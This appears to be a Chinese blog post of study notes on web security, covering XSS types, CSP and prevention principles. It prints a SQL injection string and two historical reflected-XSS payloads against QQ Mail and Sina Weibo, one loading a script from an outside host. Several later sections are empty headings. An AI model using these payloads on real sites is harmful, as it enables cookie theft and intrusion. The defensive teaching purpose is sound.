---
title: "Web Safe"
date: 2020-09-22T14:38:14+08:00
draft: false
---

web 安全领域中，常见的攻击方式，大概以下几种

- 跨站脚本
- 跨站伪造请求
- SQL 注入()
- 文件上传漏洞
- 分布式拒绝服务


```sql
SELECT uid,username FROM user WHERE username='plhwin'

-- 把plhwin 改成 plhwin';SHOW TABLES-- hack'
SELECT uid,username FROM user WHERE username='plhwin';SHOW TABLES-- hack'
```


##  客户端安全

####  跨站脚本攻击 (xss: Cross-Site Scripting)

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

防范: 不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：

- 来自用户的 UGC 信息
- 来自第三方的链接
- URL 参数
- POST 参数
- Referer （可能来自不可信的来源）
- Cookie （可能来自其他子域注入）

XSS 分类: 存储型、反射型和 DOM 型三种。

|类型      |存储区|插入点| 
|-|-|-|
|存储型 XSS|后端数据库|HTML| 
|反射型 XSS|URL|HTML| 
|DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|

存储区：恶意代码存放的位置。
插入点：由谁取得恶意代码，并插入到网页上。

存储型 XSS: 攻击者将恶意代码提交到目标网站的数据库中。用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

反射型 XSS: 攻击者构造出特殊的 URL，其中包含恶意代码。用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

DOM 型 XSS: 攻击者构造出特殊的 URL，其中包含恶意代码。用户打开带有恶意代码的 URL。用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

注意: DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。


#### XSS 攻击的预防

#### 服务端安全
- sql注入
- 文件上传漏洞
- 访问控制
- 应用层拒绝服务(分布式拒绝服务 doc攻击)


严格的 CSP 在 XSS 的防范中可以起到以下的作用：

禁止加载外域代码，防止复杂的攻击逻辑。
禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
合理使用上报可以及时发现 XSS，利于尽快修复问题。


### 防范XSS攻击
- XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。
- 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中

虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生
- 利用模板引擎 开启模板引擎自带的 HTML 转义功能
- 避免内联事件 尽量不要使用 onLoad="onload('{{data}}')"、onClick="go('{{action}}')" 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。
- 避免拼接 HTML 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。
- 时刻保持警惕 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。
- 增加攻击难度，降低攻击后果 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。
- 主动检测和发现 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。


### XSS 攻击案例

#### QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞

攻击者发现 http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。

于是攻击者构建出一个 URL，并引导用户去点击： 

http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B

浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。


#### 新浪微博名人堂反射型 XSS 漏洞

攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 URL 的内容未经过滤直接输出到 HTML 中。

于是攻击者构建出一个 URL，然后诱导用户去点击：

http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>

用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：



## 跨站点请求伪造(csrf)


## 点击劫持
## html5 安全

### 参考资料

- [Web前后端漏洞分析与防御](https://github.com/strawbreey/WebSafe-StepPitGuide)